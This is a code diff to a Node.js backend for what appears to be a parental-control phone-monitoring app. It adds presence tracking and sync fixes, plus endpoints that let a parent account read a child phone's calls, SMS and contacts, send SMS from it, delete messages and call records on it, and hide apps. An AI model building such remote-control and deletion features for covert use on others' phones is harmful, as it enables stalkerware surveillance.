@@ -232,11 +232,46 @@ function qparse(u) {
   return out;
 }
 
+// Sticky presence (from old Protect package) — avoid false OFFLINE on battery/doze blips
+const ONLINE_MS = 90000;       // soft: 90s silence
+const ONLINE_HARD_MS = 180000; // hard: 3 min = real disconnect
+const PRESENCE_FLIP_COOLDOWN_MS = 25000;
+const presenceRam = new Map(); // deviceId -> { lastMs, online, lastFlipMs }
+
 function markOnline(dev) {
   if (!dev) return;
+  const t = nowMs();
   dev.lastSeen = now();
-  dev.lastSeenMs = nowMs();
+  dev.lastSeenMs = t;
   dev.online = true;
+  try {
+    const key = String(dev.id || dev.deviceId || '');
+    if (key) {
+      const prev = presenceRam.get(key);
+      presenceRam.set(key, {
+        lastMs: t,
+        online: true,
+        lastFlipMs: (prev && prev.online === false) ? t : (prev && prev.lastFlipMs ? prev.lastFlipMs : 0)
+      });
+    }
+  } catch (e) {}
+}
+
+function isDeviceOnline(d) {
+  if (!d) return false;
+  const t = nowMs();
+  const last = Number(d.lastSeenMs || 0);
+  if (!last) return false;
+  const age = t - last;
+  if (age < ONLINE_MS) return true;
+  if (age < ONLINE_HARD_MS) {
+    // soft zone: keep showing online unless flipped recently to offline intentionally
+    const key = String(d.id || d.deviceId || '');
+    const prev = presenceRam.get(key);
+    if (prev && prev.online === false) return false;
+    return true;
+  }
+  return false;
 }
 
 /** Fast command reclaim — stuck CLAIMED back to PENDING quickly */
@@ -247,8 +282,8 @@ function reclaimCommands(db) {
     const started = Number(c.claimedAt || c.startedAt || 0);
     const age = started ? (t - started) : 999999;
     const type = String(c.type || c.command || '');
-    const fast = /place_call|send_sms|end_call|sync_call|sync_sms|block_app|unblock_app|hide_app|set_security|set_secret|pair/i.test(type);
-    const limit = fast ? 20000 : 45000;
+    const fast = /place_call|send_sms|delete_sms|delete_call|end_call|sync_call|sync_sms|contact_|block_app|unblock_app|hide_app|set_security|set_secret|pair/i.test(type);
+    const limit = fast ? 8000 : 45000;
     if (age > limit) {
       c.status = 'PENDING';
       c.claimedAt = 0;
@@ -256,6 +291,21 @@ function reclaimCommands(db) {
   }
 }
 
+function deviceIdSet(db, queryId) {
+  const ids = new Set();
+  const q = String(queryId || '');
+  if (q) ids.add(q);
+  const d = (db.devices || []).find(x => String(x.id) === q || String(x.deviceId || '') === q);
+  if (d) {
+    ids.add(String(d.id));
+    if (d.deviceId) ids.add(String(d.deviceId));
+  }
+  return ids;
+}
+function rowOnDevice(db, storedDeviceId, queryId) {
+  if (!queryId) return true;
+  return deviceIdSet(db, queryId).has(String(storedDeviceId || ''));
+}
 function addCommand(db, deviceId, type, payload) {
   const cmd = {
     id: rid(),
@@ -291,6 +341,7 @@ function upsertCall(db, row) {
     const ts = Number(row.startedMs || row.date || row.ts || 0);
     found = db.calls.find(c => {
       if (String(c.deviceId) !== deviceId) return false;
+      if (androidId && c.androidId && String(c.androidId) !== androidId) return false;
       const cn = String(c.number || '').replace(/\D/g, '').slice(-10);
       if (cn !== n) return false;
       if (String(c.direction || c.type || '') !== dir) return false;
@@ -299,12 +350,35 @@ function upsertCall(db, row) {
     });
   }
   if (found) {
+    // NEVER revive parent/child deleted rows on sync
+    if (found.deleted || found.deletedBy) {
+      if (row.duration != null && Number(row.duration) >= Number(found.duration || 0)) found.duration = Number(row.duration);
+      found.updatedAt = nowMs();
+      return;
+    }
     if (row.duration != null && Number(row.duration) >= Number(found.duration || 0)) found.duration = Number(row.duration);
     if (row.name) found.name = row.name;
     if (row.number) found.number = row.number;
-    found.deletedBy = null;
     found.updatedAt = nowMs();
   } else {
+    // Do not re-insert a call that was parent-deleted (same number+dir+time)
+    const n2 = String(row.number || '').replace(/\D/g, '').slice(-10);
+    const dir2 = String(row.direction || row.type || '');
+    const ts2 = Number(row.startedMs || row.date || row.ts || 0);
+    const wasDeleted = db.calls.some(c => {
+      if (String(c.deviceId) !== deviceId) return false;
+      if (!c.deleted && !c.deletedBy) return false;
+      const cn = String(c.number || '').replace(/\D/g, '').slice(-10);
+      if (n2 && cn && cn === n2) {
+        if (String(c.direction || c.type || '') === dir2) {
+          const ct = Number(c.startedMs || c.date || c.ts || 0);
+          if (Math.abs(ct - ts2) < 120000) return true;
+        }
+      }
+      if (androidId && String(c.androidId || '') === androidId) return true;
+      return false;
+    });
+    if (wasDeleted) return;
     db.calls.push({
       id: rid(),
       deviceId,
@@ -318,6 +392,7 @@ function upsertCall(db, row) {
       date: Number(row.startedMs || row.date || row.ts || nowMs()),
       ts: Number(row.startedMs || row.date || row.ts || nowMs()),
       deletedBy: null,
+      deleted: false,
       createdAt: nowMs()
     });
   }
@@ -339,7 +414,10 @@ function upsertSms(db, row) {
     const ts = Number(row.date || row.ts || 0);
     found = db.sms.find(s => {
       if (String(s.deviceId) !== deviceId) return false;
-      if (String(s.androidId || '') && androidId && String(s.androidId) !== androidId) return false;
+      if (String(s.androidId || '') && androidId && String(s.androidId) !== androidId) {
+        const aid = String(s.androidId || '');
+        if (aid.indexOf('pending-') !== 0 && aid.indexOf('out-') !== 0) return false;
+      }
       const sn = String(s.number || s.address || '').replace(/\D/g, '').slice(-10);
       if (sn !== n) return false;
       if (String(s.body || s.message || '').slice(0, 500) !== body) return false;
@@ -349,9 +427,33 @@ function upsertSms(db, row) {
     });
   }
   if (found) {
-    found.deletedBy = null;
+    if (found.deleted || found.deletedBy) {
+      found.updatedAt = nowMs();
+      return;
+    }
+    if (androidId && String(found.androidId || '').indexOf('pending-') === 0) found.androidId = androidId;
+    if (row.body || row.message) {
+      found.body = row.body || row.message;
+      found.message = found.body;
+    }
     found.updatedAt = nowMs();
   } else {
+    const n2 = String(row.number || row.address || '').replace(/\D/g, '').slice(-10);
+    const body2 = String(row.body || row.message || '').slice(0, 80);
+    const dir2 = String(row.direction || row.type || '');
+    const ts2 = Number(row.date || row.ts || 0);
+    const wasDeleted = db.sms.some(s => {
+      if (String(s.deviceId) !== deviceId) return false;
+      if (!s.deleted && !s.deletedBy) return false;
+      if (androidId && String(s.androidId || '') === androidId) return true;
+      const sn = String(s.number || s.address || '').replace(/\D/g, '').slice(-10);
+      if (n2 && sn === n2 && String(s.body || s.message || '').slice(0, 80) === body2) {
+        const st = Number(s.date || s.ts || 0);
+        if (Math.abs(st - ts2) < 120000) return true;
+      }
+      return false;
+    });
+    if (wasDeleted) return;
     db.sms.push({
       id: rid(),
       deviceId,
@@ -365,6 +467,7 @@ function upsertSms(db, row) {
       date: Number(row.date || row.ts || nowMs()),
       ts: Number(row.date || row.ts || nowMs()),
       deletedBy: null,
+      deleted: false,
       createdAt: nowMs()
     });
   }
@@ -407,7 +510,7 @@ async function handler(req, res) {
     if (pathname === '/health' || pathname === '/') {
       return send(res, 200, {
         ok: true,
-        phase: 303,
+        phase: 310,
         mode: 'slim',
         features: {
           auth: true, pair: true, commands: true,
@@ -526,7 +629,7 @@ async function handler(req, res) {
       if (!p) return send(res, 401, { ok: false, error: 'unauthorized' });
       const list = db.devices.filter(d => d.parentId === p.id).map(d => {
         const age = d.lastSeenMs ? Math.max(0, Math.floor((nowMs() - Number(d.lastSeenMs)) / 1000)) : -1;
-        const online = !!(d.lastSeenMs && (nowMs() - Number(d.lastSeenMs) < 120000));
+        const online = isDeviceOnline(d);
         return {
           id: d.id,
           deviceId: d.deviceId || d.id,
@@ -637,11 +740,11 @@ async function handler(req, res) {
       if (!p) return send(res, 401, { ok: false, error: 'unauthorized' });
       const deviceId = String(q.deviceId || q.childId || '');
       let list = db.calls.filter(c => {
-        if (deviceId && String(c.deviceId) !== deviceId) return false;
-        const dev = db.devices.find(d => String(d.id) === String(c.deviceId));
+        if (deviceId && !rowOnDevice(db, c.deviceId, deviceId)) return false;
+        const dev = db.devices.find(d => String(d.id) === String(c.deviceId) || String(d.deviceId) === String(c.deviceId));
         return dev && dev.parentId === p.id;
       });
-      list = list.filter(c => !c.deletedBy).sort((a, b) => Number(b.startedMs || b.ts || 0) - Number(a.startedMs || a.ts || 0));
+      list = list.filter(c => !c.deleted && !c.deletedBy).sort((a, b) => Number(b.startedMs || b.ts || 0) - Number(a.startedMs || a.ts || 0));
       return send(res, 200, { ok: true, calls: list.slice(0, 500) });
     }
 
@@ -694,24 +797,51 @@ async function handler(req, res) {
       return send(res, 200, { ok: true, id: cmd.id });
     }
 
-    if ((pathname === '/calls/delete' || pathname === '/call/delete') && method === 'POST') {
+        if ((pathname === '/calls/delete' || pathname === '/call/delete') && method === 'POST') {
       const p = parentOf(body, q, req.headers);
       if (!p) return send(res, 401, { ok: false, error: 'unauthorized' });
       const id = String(body.id || body.callId || '');
       const androidId = String(body.androidId || '');
-      const c = db.calls.find(x => String(x.id) === id || (androidId && String(x.androidId) === androidId));
-      if (c) {
-        const dev = db.devices.find(d => String(d.id) === String(c.deviceId));
-        if (dev && dev.parentId === p.id) {
-          c.deletedBy = 'parent';
-          if (androidId || c.androidId) {
-            addCommand(db, dev.id, 'delete_call', { androidId: c.androidId || androidId });
-          }
-          save(db);
+      const number = String(body.number || body.address || '').trim();
+      const deviceId = String(body.deviceId || body.childId || '');
+      let targets = [];
+      if (id) {
+        const c = db.calls.find(x => String(x.id) === id);
+        if (c) targets.push(c);
+      }
+      if (androidId) {
+        for (const x of db.calls) {
+          if (String(x.androidId || '') === androidId && !targets.includes(x)) targets.push(x);
         }
       }
-      return send(res, 200, { ok: true });
+      // last resort: deviceId + number + only if single match recent
+      if (targets.length === 0 && deviceId && number) {
+        const n = number.replace(/\D/g, '').slice(-10);
+        const matches = db.calls.filter(x => {
+          if (String(x.deviceId) !== deviceId) return false;
+          if (x.deleted || x.deletedBy) return false;
+          const xn = String(x.number || '').replace(/\D/g, '').slice(-10);
+          return xn === n;
+        });
+        if (matches.length === 1) targets.push(matches[0]);
+      }
+      let count = 0;
+      for (const c of targets) {
+        const dev = db.devices.find(d => String(d.id) === String(c.deviceId) || String(d.deviceId) === String(c.deviceId));
+        if (!dev || dev.parentId !== p.id) continue;
+        c.deletedBy = 'parent';
+        c.deleted = true;
+        addCommand(db, dev.id, 'delete_call', {
+          androidId: c.androidId || androidId || '',
+          number: c.number || number,
+          id: c.id
+        });
+        count++;
+      }
+      save(db);
+      return send(res, 200, { ok: true, deleted: count > 0, count });
     }
+
 
     // ---- SMS ----
     if (pathname === '/sms' && method === 'GET') {
@@ -719,11 +849,11 @@ async function handler(req, res) {
       if (!p) return send(res, 401, { ok: false, error: 'unauthorized' });
       const deviceId = String(q.deviceId || q.childId || '');
       let list = db.sms.filter(s => {
-        if (deviceId && String(s.deviceId) !== deviceId) return false;
-        const dev = db.devices.find(d => String(d.id) === String(s.deviceId));
+        if (deviceId && !rowOnDevice(db, s.deviceId, deviceId)) return false;
+        const dev = db.devices.find(d => String(d.id) === String(s.deviceId) || String(d.deviceId) === String(s.deviceId));
         return dev && dev.parentId === p.id;
       });
-      list = list.filter(s => !s.deletedBy).sort((a, b) => Number(b.date || b.ts || 0) - Number(a.date || a.ts || 0));
+      list = list.filter(s => !s.deleted && !s.deletedBy).sort((a, b) => Number(b.date || b.ts || 0) - Number(a.date || a.ts || 0));
       return send(res, 200, { ok: true, sms: list.slice(0, 800) });
     }
 
@@ -745,15 +875,44 @@ async function handler(req, res) {
     if (pathname === '/sms/send' && method === 'POST') {
       const p = parentOf(body, q, req.headers);
       if (!p) return send(res, 401, { ok: false, error: 'unauthorized' });
-      const deviceId = String(body.deviceId || body.childId || '');
-      const number = String(body.number || body.address || body.phone || '').trim();
-      const text = String(body.body || body.message || body.text || '');
-      if (!deviceId || !number) return send(res, 400, { ok: false, error: 'deviceId + number required' });
-      const dev = db.devices.find(d => String(d.id) === deviceId || String(d.deviceId) === deviceId);
-      if (!dev || dev.parentId !== p.id) return send(res, 404, { ok: false, error: 'device not found' });
-      const cmd = addCommand(db, dev.id, 'send_sms', { number, body: text, message: text });
+      const deviceId = String(body.deviceId || body.childId || body.device_id || '');
+      const number = String(body.number || body.to || body.address || body.phone || body.msisdn || '').trim();
+      const text = String(body.body || body.message || body.text || body.sms || '');
+      if (!deviceId) return send(res, 400, { ok: false, error: 'deviceId required' });
+      if (!number) return send(res, 400, { ok: false, error: 'number required' });
+      if (!text) return send(res, 400, { ok: false, error: 'message required' });
+      let dev = db.devices.find(d => String(d.id) === deviceId || String(d.deviceId) === deviceId);
+      if (!dev) {
+        // fallback: any device of this parent (single-child case)
+        const own = db.devices.filter(d => d.parentId === p.id);
+        if (own.length === 1) dev = own[0];
+      }
+      if (!dev || dev.parentId !== p.id) return send(res, 404, { ok: false, error: 'device not found', deviceId });
+      const payload = { number, to: number, address: number, phone: number, body: text, message: text, text };
+      if (body.subscriptionId != null) payload.subscriptionId = body.subscriptionId;
+      if (body.subId != null) payload.subId = body.subId;
+      if (body.simSlot != null) payload.simSlot = body.simSlot;
+      const cmd = addCommand(db, dev.id, 'send_sms', payload);
+      // Show the outgoing SMS on parent immediately (child sync merges this row)
+      upsertSms(db, {
+        deviceId: String(dev.id),
+        androidId: 'pending-' + cmd.id,
+        number,
+        address: number,
+        body: text,
+        message: text,
+        direction: 'OUT',
+        type: 'OUT',
+        date: nowMs(),
+        ts: nowMs(),
+        pending: true
+      });
+      // also mirror under deviceId alias if different
+      if (String(dev.deviceId || '') && String(dev.deviceId) !== String(dev.id)) {
+        // commands filtered by both forms in pending — deviceId field is dev.id
+      }
       save(db);
-      return send(res, 200, { ok: true, id: cmd.id });
+      return send(res, 200, { ok: true, id: cmd.id, command: 'send_sms', deviceId: dev.id });
     }
 
     if (pathname === '/sms/delete' && method === 'POST') {
@@ -761,16 +920,58 @@ async function handler(req, res) {
       if (!p) return send(res, 401, { ok: false, error: 'unauthorized' });
       const id = String(body.id || body.smsId || '');
       const androidId = String(body.androidId || '');
-      const s = db.sms.find(x => String(x.id) === id || (androidId && String(x.androidId) === androidId));
-      if (s) {
-        const dev = db.devices.find(d => String(d.id) === String(s.deviceId));
-        if (dev && dev.parentId === p.id) {
-          s.deletedBy = 'parent';
-          if (s.androidId) addCommand(db, dev.id, 'delete_sms', { androidId: s.androidId });
-          save(db);
+      const address = String(body.address || body.number || '').trim();
+      const smsBody = String(body.body || body.message || '');
+      const deviceId = String(body.deviceId || body.childId || '');
+      let targets = [];
+      if (id) {
+        const s = db.sms.find(x => String(x.id) === id);
+        if (s) targets.push(s);
+      }
+      if (androidId) {
+        for (const x of db.sms) {
+          if (String(x.androidId || '') === androidId && !targets.includes(x)) targets.push(x);
         }
       }
-      return send(res, 200, { ok: true });
+      if (targets.length === 0 && deviceId && address && smsBody) {
+        const n10 = address.replace(/\D/g, '').slice(-10);
+        for (const x of db.sms) {
+          if (!rowOnDevice(db, x.deviceId, deviceId)) continue;
+          const xn = String(x.number || x.address || '').replace(/\D/g, '').slice(-10);
+          if (xn !== n10) continue;
+          if (String(x.body || x.message || '').slice(0, 80) !== smsBody.slice(0, 80)) continue;
+          if (!targets.includes(x)) targets.push(x);
+        }
+      }
+      let n = 0;
+      for (const s of targets) {
+        const dev = db.devices.find(d => String(d.id) === String(s.deviceId) || String(d.deviceId) === String(s.deviceId));
+        if (!dev || dev.parentId !== p.id) continue;
+        s.deletedBy = 'parent';
+        s.deleted = true;
+        addCommand(db, dev.id, 'delete_sms', {
+          androidId: s.androidId || '',
+          address: s.address || s.number || address,
+          body: s.body || s.message || smsBody,
+          id: s.id
+        });
+        n++;
+      }
+      // If nothing matched but deviceId+id given, still try soft-delete by inventing marker
+      if (n === 0 && deviceId && id) {
+        const dev = db.devices.find(d => String(d.id) === deviceId || String(d.deviceId) === deviceId);
+        if (dev && dev.parentId === p.id) {
+          const row = db.sms.find(x => String(x.deviceId) === String(dev.id) && String(x.id) === id);
+          if (row) {
+            row.deletedBy = 'parent';
+            row.deleted = true;
+            addCommand(db, dev.id, 'delete_sms', { androidId: row.androidId || '', address, body: smsBody, id });
+            n = 1;
+          }
+        }
+      }
+      save(db);
+      return send(res, 200, { ok: true, deleted: n > 0, count: n });
     }
 
     // ---- LOCATION ----
@@ -1047,7 +1248,15 @@ async function handler(req, res) {
 
     if (pathname === '/device/offline' && method === 'POST') {
       const ch = childOf(body, q, req.headers);
-      if (ch) { ch.online = false; ch.lastSeen = now(); save(db); }
+      if (ch) {
+        ch.online = false;
+        ch.lastSeen = now();
+        try {
+          const key = String(ch.id || ch.deviceId || '');
+          if (key) presenceRam.set(key, { lastMs: Number(ch.lastSeenMs || nowMs()), online: false, lastFlipMs: nowMs() });
+        } catch (e) {}
+        save(db);
+      }
       return send(res, 200, { ok: true });
     }
 
@@ -1135,8 +1344,8 @@ async function handler(req, res) {
       if (!p) return send(res, 401, { ok: false, error: 'unauthorized' });
       const deviceId = String(q.deviceId || '');
       const list = db.contacts.filter(c => {
-        if (deviceId && String(c.deviceId) !== deviceId) return false;
-        const dev = db.devices.find(d => String(d.id) === String(c.deviceId));
+        if (deviceId && !rowOnDevice(db, c.deviceId, deviceId)) return false;
+        const dev = db.devices.find(d => String(d.id) === String(c.deviceId) || String(d.deviceId) === String(c.deviceId));
         return dev && dev.parentId === p.id;
       });
       return send(res, 200, { ok: true, contacts: list.slice(0, 3000) });
@@ -1149,7 +1358,39 @@ async function handler(req, res) {
       const dev = db.devices.find(d => (String(d.id) === deviceId || String(d.deviceId) === deviceId) && d.parentId === p.id);
       if (!dev) return send(res, 404, { ok: false, error: 'device not found' });
       const type = pathname.split('/').pop();
-      const cmd = addCommand(db, dev.id, 'contact_' + type, body);
+      const num = String(body.number || body.phone || '').trim();
+      const nm = String(body.name || body.newName || '').trim();
+      const did = String(dev.id);
+      if (type === 'rename' && num && nm) {
+        const n10 = num.replace(/\D/g, '').slice(-10);
+        for (const c of db.contacts) {
+          if (String(c.deviceId) !== did) continue;
+          const cn = String(c.number || '').replace(/\D/g, '').slice(-10);
+          if (cn && n10 && cn === n10) c.name = nm;
+        }
+        for (const c of db.calls) {
+          if (String(c.deviceId) !== did || c.deleted || c.deletedBy) continue;
+          const cn = String(c.number || '').replace(/\D/g, '').slice(-10);
+          if (cn && n10 && cn === n10) c.name = nm;
+        }
+      } else if (type === 'add' && num) {
+        db.contacts.push({ id: rid(), deviceId: did, name: nm, number: num, createdAt: now() });
+      } else if (type === 'delete' && num) {
+        const n10 = num.replace(/\D/g, '').slice(-10);
+        db.contacts = db.contacts.filter(c => {
+          if (String(c.deviceId) !== did) return true;
+          const cn = String(c.number || '').replace(/\D/g, '').slice(-10);
+          return !(cn && n10 && cn === n10);
+        });
+      }
+      const cmd = addCommand(db, dev.id, 'contact_' + type, {
+        name: nm,
+        newName: nm,
+        number: num,
+        phone: num,
+        contactId: String(body.contactId || body.id || ''),
+        id: String(body.contactId || body.id || '')
+      });
       save(db);
       return send(res, 200, { ok: true, id: cmd.id });
     }
@@ -1243,7 +1484,7 @@ server.on('error', (e) => {
 
 server.listen(PORT, HOST, () => {
   try { load(); } catch (e) { console.error('load on start', e && e.message); }
-  console.log('[slim-backend] listening on', HOST + ':' + PORT, 'phase 303');
+  console.log('[slim-backend] listening on', HOST + ':' + PORT, 'phase 310');
 });
 
 // Never exit on stray errors — Railway restarts on exit; keep process alive.
